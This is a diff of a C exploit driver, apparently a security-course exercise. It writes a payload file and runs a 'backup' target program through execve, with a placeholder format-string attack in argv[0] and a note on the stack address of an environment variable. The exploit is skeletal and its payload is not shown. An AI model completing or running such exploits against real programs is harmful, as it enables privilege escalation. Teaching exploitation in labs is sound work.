@@ -29,20 +29,17 @@ int main(int argc, char **argv)
 	int i, j;
 
 	
-
-	
-	
-	
 	payload[PAYLOAD_BUFFER_SIZE-1] = '\0';
 	payloadOutputFile = fopen("payload.txt", "w+");
 	fputs(payload, payloadOutputFile);
 	fclose(payloadOutputFile);
 	
 
-	args[0] = TARGET; args[1] = "backup";
-	args[2] = "payload.txt"; args[3] = NULL;
-	env[0] = NULL;
+	args[0] = "FORMATSTRINGHERE";  /*Format string attack here*/
+	args[1] = "backup";
+	args[2] = NULL; args[3] = NULL;
+	env[0] = "HOME=/BLAHBLAHBLAH"; /*Address of this environment variable is 0xffbfdfaa*/
 
-	if (execve(args[0], args, env) < 0)
+	if (execve(TARGET, args, env) < 0)
 		fprintf(stderr, "execve failed.\n");
 }
